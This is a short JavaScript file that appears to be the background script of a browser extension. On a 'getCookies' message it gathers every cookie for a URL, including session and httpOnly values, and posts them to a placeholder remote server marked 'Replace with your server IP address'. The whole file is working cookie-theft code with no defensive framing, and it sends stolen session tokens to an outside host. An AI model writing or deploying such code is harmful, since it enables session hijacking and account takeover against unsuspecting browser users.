chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === "getCookies") {
    chrome.cookies.getAll({url: request.url}, (cookies) => {
      const cookieData = cookies.map(cookie => ({
        name: cookie.name,
        value: cookie.value,
        domain: cookie.domain,
        path: cookie.path,
        session: cookie.session,
        hostOnly: cookie.hostOnly,
        secure: cookie.secure,
        httpOnly: cookie.httpOnly,
        sameSite: cookie.sameSite,
        expirationDate: cookie.expirationDate,
        storeId: cookie.storeId
      }));

      // Replace with your server IP address
      const serverUrl = "http://your-server-ip/cookies";

      fetch(serverUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          url: request.url,
          cookies: cookieData
        })
      })
      .then(response => response.json())
      .then(data => {
        console.log("Cookies sent successfully:", data);
        sendResponse({status: "success", data});
      })
      .catch(error => {
        console.error("Error sending cookies:", error);
        sendResponse({status: "error", error});
      });
    });
    return true; // Indicates that the response is sent asynchronously
  }
});
